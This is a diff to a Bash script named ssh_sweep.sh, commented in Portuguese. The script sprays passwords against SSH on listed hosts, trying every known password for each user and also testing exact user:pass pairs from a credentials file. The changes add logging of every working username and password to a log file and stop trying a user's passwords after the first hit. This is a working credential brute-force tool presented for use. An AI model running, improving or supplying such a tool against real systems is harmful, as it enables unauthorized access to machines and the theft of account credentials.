@@ -2,7 +2,9 @@
 # Varredura SSH: em cada host com :22, RODIZIO — cada utilizador tenta TODAS as senhas
 # conhecidas, so depois o seguinte utilizador (maximiza reutilizacao por conta).
 # CREDS_FILE (opcional) acrescenta pares user:pass exactos no fim de cada host.
-#
+# Apos a primeira senha certa para user@host, interrompe as restantes senhas desse user
+# (evita linhas "falhou" confusas e ligacoes SSH inuteis).
+#teste
 # Uso:
 #   bash ssh_sweep.sh
 #   bash ssh_sweep.sh 192.168.80.1 10.20.20.57 10.20.20.1
@@ -14,7 +16,7 @@
 #   SSH_BIN          (default: primeiro `ssh` no PATH, senao /tmp/openssh-root/usr/bin/ssh)
 #   CONNECT_TIMEOUT  (default: 6)
 #   SSH_REMOTE_CMD   (default: whoami)  — comando nao-interactivo apos auth
-#   STOP_ON_HIT      (default: 0)       — 1 = para no primeiro sucesso global
+#   STOP_ON_HIT      (default: 0)       — 1 = termina o script no primeiro sucesso (qualquer host)
 #   SKIP_PORT_CHECK  (default: 0)     — 1 = nao testa /dev/tcp/22 antes
 #   VERBOSE          (default: 0)     — 1 = mostra ultimas linhas do ssh em falhas
 #   HOSTS_FILE       ficheiro: um host por linha (# comenta)
@@ -272,10 +274,12 @@ main() {
       for pass in "${SSH_PASSWORDS[@]}"; do
         if _try_pair "${host}" "${user}" "${pass}"; then
           ok_any=1
+          echo "[+] CREDENCIAL (rodizio): ${user}@${host}  senha=${pass}" | tee -a "${LOG_FILE}"
           [[ "${STOP_ON_HIT}" == "1" ]] && {
             echo "[*] STOP_ON_HIT=1 — a terminar." | tee -a "${LOG_FILE}"
             exit 0
           }
+          break
         else
           echo "[-]     falhou ${user}@${host}" | tee -a "${LOG_FILE}"
         fi
@@ -288,6 +292,7 @@ main() {
         pass="${pair#*:}"
         if _try_pair "${host}" "${user}" "${pass}"; then
           ok_any=1
+          echo "[+] CREDENCIAL (CREDS_FILE): ${user}@${host}  senha=${pass}" | tee -a "${LOG_FILE}"
           [[ "${STOP_ON_HIT}" == "1" ]] && {
             echo "[*] STOP_ON_HIT=1 — a terminar." | tee -a "${LOG_FILE}"
             exit 0
